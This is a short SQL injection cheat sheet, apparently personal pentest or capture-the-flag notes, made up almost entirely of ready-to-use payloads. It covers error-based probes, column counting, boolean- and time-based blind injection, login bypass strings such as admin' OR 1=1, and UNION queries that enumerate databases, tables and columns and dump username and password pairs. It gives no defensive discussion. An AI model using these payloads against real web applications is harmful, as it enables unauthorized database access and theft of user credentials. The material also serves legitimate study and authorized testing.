#### Error Based
>
```
?id=1'
```
#### Column Counting
>
```
?id=1' order by 1--
```
#### Blind SQLi - Boolean Based
```
?username=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
```
#### Blind SQLi - Time Based
```
?referrer=admin123' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
?referrer=admin123' UNION SELECT SLEEP(5), 2-- -
```
#### Authentication Bypass
```
admin' OR 1=1-- -
' OR 1=1 --
admin' --
```
#### Union-Based
```
' UNION SELECT 1,2,3 --
```
```
article?id=-1 UNION SELECT 1,2,group_concat(username,':',password ) FROM staff_users
```
> show database name
```
?id=123' union select database()-- -
```
> show existing databases
```
?id=123' union select group_concat(schema_name) from information_schema.schemata-- -
```
> show existing tables
```
?id=123' union select group_concat(table_name) from information_schema.tables where table_schema='db'-- -
```
> show existing columns
```
?id=123' union select group_concat(column_name) from information_schema.columns where table_schema='db' and table_name='users'-- -
```
> show existing username and passwords
```
?id=123' union select group_concat(username,0x3a,password) from users-- -
```

